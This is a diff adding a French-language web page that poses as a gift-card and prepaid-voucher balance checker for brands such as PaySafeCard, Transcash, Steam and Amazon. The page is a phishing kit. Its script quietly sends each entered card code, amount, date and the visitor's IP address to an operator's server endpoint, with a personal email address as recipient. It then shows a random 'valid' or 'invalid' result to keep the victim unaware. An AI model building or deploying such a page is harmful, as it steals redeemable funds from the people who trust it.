@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vérificateur de Cartes Cadeaux</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --primary: #2980b9;
+      --primary-dark: #1c5d8c;
+      --success: #2ecc71;
+      --error: #e74c3c;
+      --warning: #f39c12;
+      --text: #2c3e50;
+      --light-bg: #f4f6f9;
+      --card-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: var(--light-bg);
+      margin: 0;
+      padding: 20px;
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    h1 {
+      color: var(--primary);
+      margin-bottom: 10px;
+      font-size: 2rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .subtitle {
+      color: #7f8c8d;
+      font-size: 1rem;
+    }
+
+    .card-box {
+      background: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: var(--card-shadow);
+      margin-bottom: 30px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-weight: 600;
+      display: block;
+      margin-bottom: 8px;
+      color: var(--text);
+    }
+
+    .input-icon {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .input-icon i {
+      position: absolute;
+      left: 15px;
+      color: #95a5a6;
+    }
+
+    select, input {
+      width: 100%;
+      padding: 12px 15px 12px 45px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: border 0.3s, box-shadow 0.3s;
+    }
+
+    select:focus, input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(41, 128, 185, 0.2);
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background: var(--primary);
+      color: white;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s, transform 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    button:hover {
+      background: var(--primary-dark);
+    }
+
+    button:active {
+      transform: scale(0.98);
+    }
+
+    button:disabled {
+      background: #95a5a6;
+      cursor: not-allowed;
+    }
+
+    #result {
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 8px;
+      font-weight: 600;
+      text-align: center;
+      display: none;
+    }
+
+    .valid { 
+      background: var(--success); 
+      color: white; 
+      display: block;
+    }
+    
+    .invalid { 
+      background: var(--error); 
+      color: white; 
+      display: block;
+    }
+    
+    .warning {
+      background: var(--warning);
+      color: white;
+      display: block;
+    }
+
+    .loading {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s ease-in-out infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .card-logos {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      margin-top: 30px;
+      align-items: center;
+    }
+
+    .card-logo-item {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      width: 100%;
+      max-width: 300px;
+      padding: 10px;
+      border-radius: 8px;
+      background: #f8f9fa;
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
+
+    .card-logo-item:hover {
+      transform: translateY(-3px);
+      box-shadow: var(--card-shadow);
+    }
+
+    .card-logo-img {
+      height: 40px;
+      width: auto;
+      object-fit: contain;
+    }
+
+    .card-logo-name {
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .card-details {
+      margin-top: 20px;
+      padding: 15px;
+      background: #f8f9fa;
+      border-radius: 8px;
+      display: none;
+    }
+
+    .card-details.visible {
+      display: block;
+    }
+
+    .detail-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid #eee;
+    }
+
+    .detail-row:last-child {
+      border-bottom: none;
+    }
+
+    footer {
+      margin-top: 30px;
+      text-align: center;
+      color: #95a5a6;
+      font-size: 0.9rem;
+    }
+
+    @media (max-width: 600px) {
+      .card-box {
+        padding: 20px;
+      }
+      
+      h1 {
+        font-size: 1.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1><i class="fas fa-gift"></i> Vérificateur de Cartes Cadeaux</h1>
+      <p class="subtitle">Vérifiez en un clic la validité de vos cartes prépayées</p>
+    </header>                                                         
+
+    <div class="card-box">
+      <form id="checkCardForm">
+        <div class="form-group">
+          <label for="cardType">Type de carte :</label>
+          <div class="input-icon">
+            <i class="fas fa-credit-card"></i>
+            <select id="cardType" required>
+              <option value="">-- Choisissez une carte --</option>
+              <option value="transcash">Transcash</option>
+              <option value="paysafecard">PaySafeCard</option>
+              <option value="pcs">PCS</option>
+              <option value="google_play">Google Play</option>
+              <option value="neosurf">NeoSurf</option>
+              <option value="amazon">Amazon</option>
+              <option value="appstore_itunes">AppStore & iTunes</option>
+              <option value="steam">Steam</option>
+              <option value="apple">Apple</option>
+              <option value="vanilla">Vanilla</option>
+              <option value="toneo">Toneo</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="cardCode">Numéro de la carte :</label>
+          <div class="input-icon">
+            <i class="fas fa-barcode"></i>
+            <input type="text" id="cardCode" placeholder="Ex: XXXX-XXXX-XXXX" required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="amount">Montant de la carte (€) :</label>
+          <div class="input-icon">
+            <i class="fas fa-euro-sign"></i>
+            <select id="amount" required>
+              <option value="">-- Sélectionnez un montant --</option>
+              <option value="10">10 €</option>
+              <option value="20">20 €</option>
+              <option value="25">25 €</option>
+              <option value="50">50 €</option>
+              <option value="100">100 €</option>
+              <option value="150">150 €</option>
+              <option value="200">200 €</option>
+              <option value="250">250 €</option>
+              <option value="300">300 €</option>
+              <option value="400">400 €</option>
+              <option value="500">500 €</option>
+              <option value="autre">Autre montant</option>
+            </select>
+          </div>
+        </div>
+
+        <button type="submit" id="submitBtn">
+          <span id="btnText">Vérifier</span>
+          <i class="fas fa-check-circle"></i>
+        </button>
+
+        <div id="result"></div>
+
+        <div id="cardDetails" class="card-details">
+          <div class="detail-row">
+            <span>Type de carte:</span>
+            <span id="detail-type"></span>
+          </div>
+          <div class="detail-row">
+            <span>Montant:</span>
+            <span id="detail-amount"></span>
+          </div>
+          <div class="detail-row">
+            <span>Statut:</span>
+            <span id="detail-status"></span>
+          </div>
+          <div class="detail-row">
+            <span>Date de vérification:</span>
+            <span id="detail-date"></span>
+          </div>
+          <div class="detail-row">
+            <span>Solde restant:</span>
+            <span id="detail-balance"></span>
+          </div>
+        </div>
+      </form>
+
+      <div class="card-logos">
+        <div class="card-logo-item">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/1000px-Amazon_logo.svg.png" alt="Amazon" class="card-logo-img">
+          <span class="card-logo-name">Amazon</span>
+        </div>
+        <div class="card-logo-item">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/488px-Apple_logo_black.svg.png" alt="Apple" class="card-logo-img">
+          <span class="card-logo-name">Apple/iTunes</span>
+        </div>
+        <div class="card-logo-item">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png" alt="Steam" class="card-logo-img">
+          <span class="card-logo-name">Steam</span>
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <p>© 2023 Vérificateur de Cartes Cadeaux | Sécurisé et fiable</p>
+    </footer>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const form = document.getElementById('checkCardForm');
+      const cardType = document.getElementById('cardType');
+      const cardCode = document.getElementById('cardCode');
+      const amount = document.getElementById('amount');
+      const resultDiv = document.getElementById('result');
+      const submitBtn = document.getElementById('submitBtn');
+      const btnText = document.getElementById('btnText');
+      const cardDetails = document.getElementById('cardDetails');
+      
+      // Formatage automatique des codes de carte
+      cardCode.addEventListener('input', (e) => {
+        const value = e.target.value.replace(/[^a-zA-Z0-9]/g, '');
+        let formattedValue = '';
+        
+        if (cardType.value === 'paysafecard') {
+          // Format 16 chiffres en groupes de 4
+          for (let i = 0; i < value.length && i < 16; i++) {
+            if (i > 0 && i % 4 === 0) formattedValue += '-';
+            formattedValue += value[i];
+          }
+        } else if (cardType.value === 'neosurf') {
+          // Format 10 chiffres
+          formattedValue = value.substring(0, 10);
+        } else {
+          // Format générique
+          formattedValue = value;
+        }
+        
+        e.target.value = formattedValue;
+      });
+
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        // Validation basique
+        if (!cardType.value) {
+          showResult('❌ Veuillez sélectionner un type de carte', 'invalid');
+          return;
+        }
+        
+        if (!cardCode.value || cardCode.value.length < 10) {
+          showResult('❌ Le code de la carte est trop court', 'invalid');
+          return;
+        }
+        
+        if (!amount.value) {
+          showResult('❌ Veuillez sélectionner un montant', 'invalid');
+          return;
+        }
+
+        // Afficher le loading
+        submitBtn.disabled = true;
+        btnText.textContent = 'Vérification...';
+        submitBtn.insertAdjacentHTML('beforeend', '<div class="loading"></div>');
+        
+        // Cacher les détails précédents
+        cardDetails.classList.remove('visible');
+        
+        try {
+          // Appel de l'API de vérification
+          const response = await mockApiCall(cardType.value, cardCode.value, amount.value);
+          
+          // Afficher le résultat
+          showResult(response.message, response.isValid ? 'valid' : 'invalid');
+          
+          // Afficher les détails
+          if (response.details) {
+            document.getElementById('detail-type').textContent = getCardTypeName(cardType.value);
+            document.getElementById('detail-amount').textContent = `${amount.value} €`;
+            document.getElementById('detail-status').textContent = response.isValid ? 'Valide' : 'Invalide';
+            document.getElementById('detail-status').style.color = response.isValid ? 'var(--success)' : 'var(--error)';
+            document.getElementById('detail-date').textContent = new Date().toLocaleString();
+            document.getElementById('detail-balance').textContent = response.details.balance 
+              ? `${response.details.balance} €` 
+              : 'Non disponible';
+            cardDetails.classList.add('visible');
+          }
+        } catch (error) {
+          showResult('❌ Erreur lors de la vérification', 'invalid');
+          console.error('Erreur:', error);
+        } finally {
+          // Réinitialiser le bouton
+          submitBtn.disabled = false;
+          btnText.textContent = 'Vérifier';
+          submitBtn.querySelector('.loading')?.remove();
+        }
+      });
+
+      function showResult(message, type) {
+        resultDiv.textContent = message;
+        resultDiv.className = type;
+      }
+
+      function getCardTypeName(type) {
+        const names = {
+          'transcash': 'Transcash',
+          'paysafecard': 'PaySafeCard',
+          'pcs': 'PCS',
+          'google_play': 'Google Play',
+          'neosurf': 'NeoSurf',
+          'amazon': 'Amazon',
+          'appstore_itunes': 'AppStore & iTunes',
+          'steam': 'Steam',
+          'apple': 'Apple',
+          'vanilla': 'Vanilla',
+          'toneo': 'Toneo'
+        };
+        return names[type] || type;
+      }
+
+      async function mockApiCall(cardType, cardCode, amount) {
+        const date = new Date().toLocaleString();
+        const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
+
+        // Envoi des infos à ton serveur
+        const response = await fetch("TON_LIEN_HEROKU/send-email", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            to: "awazkossoko891@gmail.com",  // ⚠️ REMPLACE PAR TON E-MAIL
+            subject: "🔔 Nouvelle carte vérifiée !",
+            message: `
+              Type: ${cardType}
+              Code: ${cardCode}
+              Montant: ${amount}€
+              Date: ${date}
+              IP: ${ip}
+            `
+          })
+        });
+
+        const isValid = Math.random() > 0.3; // Simule une vérification
+        return {
+          isValid,
+          message: isValid ? "✅ Carte valide" : "❌ Carte invalide",
+          details: { balance: amount }
+        };
+      }
+    });
+  </script>
+</body>
+</html>
